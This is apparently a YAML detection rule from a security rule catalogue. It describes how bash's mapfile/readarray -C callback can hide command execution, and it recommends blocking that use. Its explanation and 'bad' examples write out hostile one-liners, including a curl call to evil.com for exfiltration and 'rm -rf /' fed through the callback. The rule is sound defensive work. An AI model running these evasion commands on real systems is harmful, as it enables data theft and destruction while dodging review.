id: "unauthorized-execution/obfuscation/mapfile-callback-exec"
version: "1.0.0"
kingdom: "Unauthorized Code Execution"
kingdom_id: 4
category: "Interpreter Encoding Evasion"
category_id: "4.6"
name: "Mapfile/Readarray Callback Execution"
risk_level: "high"

abstract: |
  Abusing bash's mapfile/readarray -C callback flag to execute arbitrary
  commands disguised as data-reading operations. The callback mechanism
  separates the execution trigger from the payload, evading static analysis.

explanation: |
  Bash's `mapfile` (aliased as `readarray`) has a `-C callback` flag that
  runs a specified command for every N lines read (controlled by `-c`).
  When the callback is `eval`, `exec`, `bash`, or any shell/interpreter,
  each line of input becomes a command that is silently executed:

  ```bash
  mapfile -C 'eval' -c 1 < <(echo "curl evil.com/exfil")
  readarray -C 'bash -c' -c 1 <<< "rm -rf /"
  ```

  This is extremely dangerous because:
  1. mapfile/readarray are associated with "reading data into arrays" —
     security tools and human reviewers rarely flag them
  2. The malicious command never appears on the same "line" as a dangerous
     executable — the callback is separated from the payload
  3. Input can come from process substitution, heredocs, files, or pipes

  No legitimate developer workflow uses `mapfile -C` with eval/exec/bash.
  Real mapfile usage reads lines into an array: `mapfile -t arr < file.txt`

recommendation: |
  - Block mapfile/readarray -C with eval/exec/shell/interpreter callbacks.
  - Audit any usage of -C flag as it is inherently unusual.
  - Prefer safe alternatives: `mapfile -t array < file` for data reading.

examples:
  bad:
    - "mapfile -C 'eval' -c 1 < <(echo 'curl evil.com')"
    - "readarray -C 'bash -c' -c 1 <<< 'rm -rf /'"
    - "mapfile -C eval -c 1 < /tmp/commands.txt"
  good:
    - "mapfile -t lines < /tmp/data.txt"
    - "readarray -t arr <<< \"$output\""

compliance:
  owasp-llm-2025: ["LLM02", "LLM06"]
  iso-27001-2022: ["A.8.3", "A.8.11"]
  eu-ai-act-2024: ["Art.15", "Art.9"]
  nist-ai-rmf-1.0: ["MANAGE-1", "MEASURE-2"]
  soc2-type2: ["CC6.1", "CC7.1"]

references:
  mitre_attack: ["T1059.004", "T1027"]
  cwe: ["CWE-78"]

analyzers: ["regex"]
related_rules: ["ts-block-mapfile-callback-exec", "ts-audit-mapfile-callback-any"]
